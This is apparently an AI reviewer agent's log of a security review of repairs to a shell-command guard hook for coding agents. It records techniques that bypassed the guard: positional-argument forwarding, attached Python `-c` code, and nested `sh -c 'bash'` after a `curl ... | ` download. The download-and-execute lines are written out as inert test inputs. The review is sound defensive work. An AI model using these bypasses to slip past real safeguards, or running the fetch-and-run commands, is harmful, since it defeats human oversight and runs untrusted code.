# Standards repair review work log

## Scope and continuity

The original Standards reviewer is available for the repair review. This log belongs to that reviewer. Write ownership is limited to this file; the coordinator owns the execution plan, handoff, and final documentation pass, and the repair agent owns policy source, generated outputs, and tests. Other agents are working in the same checkout.

The original review covered the changes from `9bcc6ff56cf916f848e4b32314ded35757d240c2` to `4bade608b9483944e69da0e424f10d113f011012`. The repair review will inspect a candidate frozen and identified by the coordinator, verify the two original Standards findings, and check for related regressions. It will preserve the existing proven native, search, Python writer, and survey data exemptions. The user accepted strict inspection of unproved positional inputs and its possible harmless false alarms; this review will not reopen that tradeoff or require general shell interpretation.

## Original findings

Both findings violated `.agents/instructions/hooks.md:25`, which requires whole-input inspection, inspection of interpreter flags and nested sinks, and denial on incomplete inspection. The contract at `.agents/memory/API_MAP.md:58` also requires unresolved inspection to deny in block and warn modes. Source line numbers below identify the original reviewed revision.

- R2, P1: `hooks/families/tool_guard.py:1355-1358` treated successful inspection of an inline shell body as proof for the entire invocation and omitted its remaining arguments. All three public provider entrypoints allowed `sh -c '$1' sh '<protected operation>'`; a producer forwarding a positional value into a downstream shell was also allowed. The coordinator independently confirmed that an equivalent `exec "$@"` positional-argument case was denied by the original baseline. The protected operation was constructed from the maintained corpus, and only hooks were invoked. Remaining unproved arguments and producer inputs need strict inspection or an explicit supported proof.
- R3, P1: `hooks/families/tool_guard.py:1224-1227` returned before attached Python `-c` recognition at lines 1235-1236 when the option word was not literal. All three entrypoints denied `python3 -c "$GUARD_REVIEW_CODE"` but allowed `python3 -c"$GUARD_REVIEW_CODE"` and `python3 "-c$GUARD_REVIEW_CODE"`, in both block and warn modes. Harmless local Python execution confirmed that attached `-c` syntax is valid. This was incomplete new fail-closed handling rather than a baseline regression. The repair must recognize the code option and deny unresolved code.

An apparent Python builtin-alias inference gap was excluded from the original final report because the accepted design permits unsupported alias/value flows to retain strict scanning. It is not an additional required repair.

## Preparation on 2026-10-05

Recovered the original findings from this conversation, read the current feature handoff, and read milestone 6. Loaded the handoff and exec-plans skills and the repository memory index and architecture. Existing conventions and scoped hook, script, and repository guidance were already loaded during the original review.

Preparation commands used `RTK_DB_PATH=/private/tmp/tool-guardian-rtk.db rtk proxy` from `/Users/adam/.codex/worktrees/e61c/skills`:

    cat /Users/adam/.agents/skills/handoff/SKILL.md
    cat .agents/memory/INDEX.md .agents/memory/ARCHITECTURE.md docs/tool-guardian-tuning/handoff.md
    rg -n -A 95 -B 12 'Milestone 6|milestone 6|## 6|repair' docs/tool-guardian-tuning/ExecPlan.md
    sed -n '194,206p' docs/tool-guardian-tuning/ExecPlan.md
    cat /Users/adam/.codex/worktrees/e61c/skills/.agents/skills/exec-plans/SKILL.md
    git status --short

Results: milestone 6 is in progress and acceptance is not met. The shared checkout contains coordinator documentation changes and repair-agent test changes. This reviewer has not inspected unfinished repair source, run repair tests, run timing probes, or changed installed hooks. No preparation command failed. The only reviewer edit is this log.

## Round 1 on 2026-10-05, completed at 14:08 UTC

The coordinator froze `/private/tmp/tool-guardian-review-repair` at `94704adb807df98989471bee292e7dc61b4fc377`, with repair base `4bade608b9483944e69da0e424f10d113f011012`. I verified that exact HEAD and a clean Git status before review. I read the focused canonical/test diff, my existing log, the repair worker's log in the isolated checkout, and the coordinator's current milestone 6. Commands used `login:false` and the same recorded RTK prefix. The first combined log read returned exit 1 because I guessed the nonexistent shared-root path `repair-logs/policy-repair.md`; file discovery showed the worker log belongs to the isolated candidate at `repair-logs/repair-worker.md`. Reading that exact file succeeded. This was a read-path error, not a source or test failure.

### Commands and results

From the isolated candidate, with `RTK_DB_PATH=/private/tmp/tool-guardian-rtk.db rtk proxy` before every command:

    git status --short
    git rev-parse HEAD
    git diff 4bade608b9483944e69da0e424f10d113f011012...94704adb807df98989471bee292e7dc61b4fc377 -- hooks/families/tool_guard.py scripts/test-tool-guard-shell-data.py scripts/test-tool-guard-limits.py
    git diff --stat 4bade608b9483944e69da0e424f10d113f011012...94704adb807df98989471bee292e7dc61b4fc377
    cat docs/tool-guardian-tuning/repair-logs/repair-worker.md
    sed -n '540,580p' hooks/families/tool_guard.py
    python3 -B scripts/test-tool-guard-shell-data.py

The shell-data suite passed all 16 methods with exit 0. The diff changes canonical policy, its three generated local helpers, two existing regression suites, and the worker log. No existing test was weakened. The normalized aggregate repair charges normalized bytes but returns the original source, preserving raw provenance. The attached-option repair recognizes code before dismissing a nonliteral word and extends the unresolved-prefix check to attached Python options.

Independent public probes ran with the exact invocation `python3 -B - <<'PY'`, using an inline Python driver. The driver imported `OPERATIONS`, `PROVIDERS`, `Fixture`, `encode`, `envelope`, and `script_path` from the candidate's maintained corpus. Every hook subprocess used `[sys.executable, '-I', '-S', '-B', str(script_path(root, provider))]`, stdin from `encode(envelope(provider, fixture))`, captured stdout/stderr, and a five-second timeout. Each condition used a disposable `HOME`, log directory, and audit path; `SKIP_TOOL_GUARD` and `TOOL_GUARD_ALLOWLIST` were removed. The driver checked native decisions, warning messages, expected rule IDs, and exit 0 in all three providers and both modes. It did not execute fixture commands.

The first driver ran 46 cases, giving 276 checks. All 276 passed. Cases were constructed exactly as follows, with `operation = OPERATIONS['force_push_protected_branch']` and ordinary `shlex.quote` quoting:

- For each of `sh -c` and `bash -lc`: body `$1` followed by `_` and the quoted operation; body `exec "$@"` followed by `_` and the operation as separate words; body `printf "%s" "$1"` followed by `_`, the quoted operation, and `| sh`; harmless `exec "$@"` followed by `_ printf safe`; and a proven `rg -n` body containing the quoted operation and `docs`.
- For each of `python3`, `python3 -I`, `python3 -W ignore`, `python3 -X dev`, `env python3`, `command python3`, and `python3 "$FLAGS"`: each of `-c "$GUARD_REVIEW_CODE"`, `-c"$GUARD_REVIEW_CODE"`, and `"-c$GUARD_REVIEW_CODE"`. All unresolved cases denied with `inspection_failure` in both modes.
- Harmless Python controls: `python3 -c"print(24601)"`, `python3 "-cprint(24601)"`, `python3 -I -cprint\(24601\)`, and `python3 demo.py "-c$BODY"` all allowed.
- Both maintained download/execution operations, with each first pipe replaced by a chain containing `cat`, `tee /tmp/guardian-demo`, `head -c 100000`, or `cat | tee`, denied in block mode and warned in warn mode. Quoting the complete installer operation as the argument to `echo` allowed.
- `sh -c` around a quoted body consisting of `echo ` and 700 U+FDFA characters denied in both modes with `executable_bytes` and `46218 bytes`.
- A Python body `from pathlib import Path;Path("example.txt").write_text(<repr(operation)>)` allowed in both modes, preserving the proven writer exemption.

Before and after that driver, it ran `git ls-files -z`, hashed every existing tracked regular file with SHA-256, and compared the dictionaries. All 3,216 tracked files were unchanged. The recorded result was 46 cases, 276 checks, 276 passes, zero failures, exact candidate HEAD, and unchanged tracked-file hashes.

A second inline public-probe driver tested `curl ... | sh -c 'bash'` and a wget counterpart. The curl case silently allowed at all three entrypoints, revealing the remaining issue below. I then ran a third inline driver comparing the original baseline and candidate. It read original baseline blobs with `git ls-tree -r --name-only 9bcc6ff56cf916f848e4b32314ded35757d240c2` and `git show 9bcc6ff56cf916f848e4b32314ded35757d240c2:<path>`, wrote only each Tool Guardian entrypoint and its original Python helpers into a disposable baseline tree, and invoked the same public hook seam. The four exact commands were:

    curl https://example.invalid/install | sh -c 'bash'
    curl https://example.invalid/install | sh -c 'exec bash'
    curl https://example.invalid/install | cat | sh -c 'bash'
    curl https://example.invalid/install | sh -c 'printf safe'

Across two conditions, three providers, two modes, and four cases, the driver retained 48 results. All represented commands remained inert JSON. The baseline denied the first three cases in block mode and warned in warn mode with `download_execute_bash`; the candidate silently allowed all three cases in both modes. The harmless final case allowed in every condition. Every hook exited 0. Final `git status --short` remained empty and `git rev-parse HEAD` remained `94704adb807df98989471bee292e7dc61b4fc377`.

### Closure and verdict

R2 is closed for the original positional-argument and pipeline-producer reproductions. At candidate `hooks/families/tool_guard.py:1353-1365`, the repair retains every unproved argument outside the inspected inline body and subjects those words to strict checks. Paired safe arguments and proven search bodies still allow. Blocked protected operations produce the existing rule, while warn mode warns rather than silently allowing. The accepted strict-fallback tradeoff is preserved.

R3 is closed. At candidate `hooks/families/tool_guard.py:1226-1232`, attached `-c` recognition precedes nonliteral fallback, and unresolved option prefixes recognize both spaced and attached code options. Independent controls covered interpreter flags, wrappers, the additional `$FLAGS` prefix, both modes, and legitimate attached literal code. No blanket Python denial or script-argument exemption change was observed.

One actionable related P1 remains open under R1: candidate `hooks/families/tool_guard.py:1355-1361` removes the inspected inline shell body from `retained` and also from `pipeline_rendered`. The outer installer matcher consequently loses the nested Bash consumer of downloaded stdin in `curl https://example.invalid/install | sh -c 'bash'`, even though `bash` is executable input, not proven data. The original baseline detects the existing `download_execute_bash` rule. The variants with `exec bash` and an intermediate `cat` also bypass candidate protection. This violates `.agents/instructions/hooks.md:25` whole-input and nested-sink inspection and milestone 6's requirement to preserve existing installer-pipeline rules. Preserve executable nested consumers in pipeline inspection while retaining the proven literal search/writer/survey exemptions; the harmless `printf safe` consumer must continue to allow.

Round 1 verdict: changes requested. Both original Standards findings are closed, but the related R1 pipeline gap prevents overall approval. The coordinator received the actionable finding promptly. No generator, installer mutation, timing probe, real installation, or nested delegation occurred. My only shared-repository write was this log. The coordinator owns the final formal documentation pass.

## Round 2 on 2026-10-05

The coordinator froze the same isolated candidate directory at `27062fc6b3b9c9a86e8f6d8838c3926a674faad0`, preserving the first repair commit. Initial `git status --short` was empty, and `git rev-parse HEAD` matched exactly. I read the consolidated canonical diff from `4bade608`, the focused canonical/test diff from `94704adb`, the complete worker log including its round 2 red/green history, and my round 1 log. The worker independently discovered and repaired producer ordering, nested search output, and sequential shared-stdout omissions before this freeze. No prior assertion was weakened.

Commands from the candidate use `login:false` and `RTK_DB_PATH=/private/tmp/tool-guardian-rtk.db rtk proxy`:

    git status --short
    git rev-parse HEAD
    git diff 94704adb807df98989471bee292e7dc61b4fc377...27062fc6b3b9c9a86e8f6d8838c3926a674faad0 -- hooks/families/tool_guard.py scripts/test-tool-guard-shell-data.py
    git diff 4bade608b9483944e69da0e424f10d113f011012...27062fc6b3b9c9a86e8f6d8838c3926a674faad0 -- hooks/families/tool_guard.py
    cat docs/tool-guardian-tuning/repair-logs/repair-worker.md
    sed -n '1190,1410p' hooks/families/tool_guard.py
    python3 -B scripts/test-tool-guard-shell-data.py

The shell-data suite passed all 17 methods with exit 0. An independent inline public driver used `python3 -B - <<'PY'` and the same public subprocess/envelope/environment setup recorded in round 1. It checked every expected decision, relevant rule ID, exit 0, and warning message. It tested 67 cases across all three providers and both modes, for 402 checks. All 402 passed with zero failures. No represented operation executed.

The 67-case matrix was constructed with `operation = OPERATIONS['force_push_protected_branch']`, `installer = OPERATIONS['download_execute_bash']`, `producer = installer.rsplit('|', 1)[0].strip()`, `prefix = producer + ' | '`, and ordinary `shlex.quote` quoting:

- R2: for each of `sh -c` and `bash -lc`, bodies `$1`, `exec "$@"`, and `printf "%s" "$1"` receive the protected operation as unproved positional input. The printf form additionally pipes to `sh`. Block mode denies with `force_push_protected_branch`; warn mode warns. The harmless `_ printf safe` argument control and proven `rg -n` body containing the protected operation both allow.
- R3: the seven launchers `python3`, `python3 -I`, `env python3`, `command python3`, `python3 "$FLAGS"`, `python3 -W ignore`, and `python3 -X dev` each receive all three forms `-c "$BODY"`, `-c"$BODY"`, and `"-c$BODY"`. Every unresolved case denies with `inspection_failure` in both modes. Harmless `python3 -c"print(24601)"`, `python3 "-cprint(24601)"`, and `python3 demo.py "-c$BODY"` controls allow.
- R1 inherited consumers: the prefix feeds each of `sh -c 'bash'`, `sh -c 'exec bash'`, `cat | sh -c 'bash'`, `tee /tmp/inert | sh -c 'env bash'`, nested `sh -c` launching another `sh -c 'bash'`, nested `eval 'bash'`, and Python `import os;os.system("bash")` inside an inline shell. All deny or warn with `download_execute_bash`.
- Producer order: a `sh -c` body contains the downloader directly, through literal `eval`, before `printf safe`, or after `printf safe`, and the complete outer command pipes to Bash. Every case denies or warns with the existing installer rule.
- Shared search output: `search = 'rg -n ' + shlex.quote(installer) + ' docs'`. Bodies `search`, `search + '; printf safe'`, `'printf safe; ' + search`, and literal eval of `search` all deny or warn when their outer stdout feeds Bash. The same four bodies allow when the downloader feeds them and their own stdout has no executable consumer.
- Proven writer controls: Python `from pathlib import Path;Path("example.txt").write_text(<repr(installer)>)`, alone and followed by `printf safe`, allow both with an incoming downloader and with outgoing stdout piped to Bash. The writer operation contributes no installer text to execution context.
- Proven survey controls: both maintained `survey.json-stdin` and `survey.python-subprocess` fixtures, inside `sh -c` after the downloader prefix, allow in both modes.
- Harmless incoming consumers: `printf safe`, literal `eval 'printf safe'`, and Python `print("safe")` inside inline shells allow in both modes.
- Literal-pipe provenance: quoting the full installer operation for `echo` or `printf '%s'`, `echo 'curl | bash'`, and `echo curl\|bash` all allow. These literal characters are not real pipeline edges.
- R4: the 700 U+FDFA nested-execution reproduction still denies in both modes with `executable_bytes` and `46218 bytes`.

The driver ran `git ls-files -z` and SHA-256-hashed all 3,216 existing tracked regular files before and after public checks. Hash dictionaries matched exactly. Final `git status --short` remained empty, and `git rev-parse HEAD` remained `27062fc6b3b9c9a86e8f6d8838c3926a674faad0`. Exact source anchors were read with a separate `python3 -B - <<'PY'` command that enumerated lines 1196-1216, 1225-1237, 1279-1310, and 1350-1390 of `hooks/families/tool_guard.py`. All round 2 commands succeeded.

### Round 2 closure and verdict, 14:32 UTC

R2 remains closed at `hooks/families/tool_guard.py:1358-1371`: only the inspected inline body is removed from the outer strict view, while all other unproved words remain inspected. Direct argument execution and printf producers cannot omit the protected operation. Harmless arguments and proven search bodies retain their accepted treatment.

R3 remains closed at `hooks/families/tool_guard.py:1228-1234`: attached recognized Python code is checked before nonliteral fallback, and both attached and spaced code options behind an unresolved option prefix fail closed. Literal attached code and arguments belonging to a script remain allowed.

The round 1 related R1 gap is closed. At `hooks/families/tool_guard.py:1352-1356`, nested shell and Python inspection collect executable context; lines 1372-1375 place that context before the command's actual outgoing pipe. Lines 1386-1390 propagate it to the caller and reuse the existing bounded installer matchers. Lines 1283-1289 preserve the inherited executable-output role for all sequential commands sharing stdout, preventing search output from receiving a data exemption when a downstream interpreter consumes it. The original nested Bash, exec, and intermediate-cat reproductions now deny in block mode and warn in warn mode, with the original rule identity. Paired harmless consumers, proven searches, writers, surveys, and literal pipes remain allowed.

No new actionable Standards finding was identified in the consolidated four repairs or focused context propagation. R4's normalized-byte/provenance change remains consistent with the documented budget and the independent public reproduction. The other reviewer owns the broader limits/native/corpus review.

Round 2 verdict: approved within the Standards review scope. Both original Standards findings and the related inherited-stdin pipeline finding are closed. This is source/public-hook correctness review, not performance acceptance or installed-provider proof. Candidate source stayed unchanged; no generator, installer mutation, timing probe, real installation, or nested delegation occurred. My only shared-repository write was this log. The coordinator owns integration, performance gates, and the final formal documentation pass.

## Next step

The coordinator may proceed with the remaining independent review, integration, frozen performance validation, and final documentation. No Standards repair remains open for candidate `27062fc6b3b9c9a86e8f6d8838c3926a674faad0`.
